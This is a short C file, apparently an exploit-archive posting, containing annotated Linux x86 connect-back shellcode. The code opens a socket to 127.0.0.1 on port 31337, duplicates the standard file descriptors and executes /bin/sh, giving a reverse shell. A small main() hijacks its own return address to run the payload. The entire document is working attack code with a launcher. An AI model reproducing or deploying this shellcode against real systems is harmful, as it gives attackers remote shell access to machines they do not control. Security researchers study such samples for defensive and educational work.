/*
 * (linux/x86) connect-back shellcode, 127.0.0.1:31337/tcp - 74 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x66"              // push $0x66
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x6a\x01"              // push $0x1
	"\x5b"                  // pop %ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x6a\x02"              // push $0x2
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80
	"\x5b"                  // pop %ebx
	"\x5d"                  // pop %ebp
	"\xbe\x80\xff\xff\xfe"  // mov $0xfeffff80,%esi (0xxfeffff80 = ~127.0.0.1)
	"\xf7\xd6"              // not %esi
	"\x56"                  // push %esi
	"\x66\xbd\x69\x7a"      // mov $0x7a69,%bp (0x7a69 = 31337)
	"\x0f\xcd"              // bswap %ebp
	"\x09\xdd"              // or %ebx,%ebp
	"\x55"                  // push %ebp
	"\x43"                  // inc %ebx
	"\x6a\x10"              // push $0x10
	"\x51"                  // push %ecx
	"\x50"                  // push %eax
	"\xb0\x66"              // mov $0x66,%al

	//
	// <_doint>:
	//

	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80"              // int $0x80
	"\x87\xd9"              // xchg %ebx,%ecx
	"\x5b"                  // pop %ebx

	//
	// <_dup2loop>:
	//

	"\xb0\x3f"              // mov $0x3f,%al
	"\xcd\x80"              // int $0x80
	"\x49"                  // dec %ecx
	"\x79\xf9"              // jns <_dup2loop>
	"\xb0\x0b"              // mov $0xb,%al
	"\x52"                  // push %edx
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\xeb\xdf";             // jmp <_doint>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]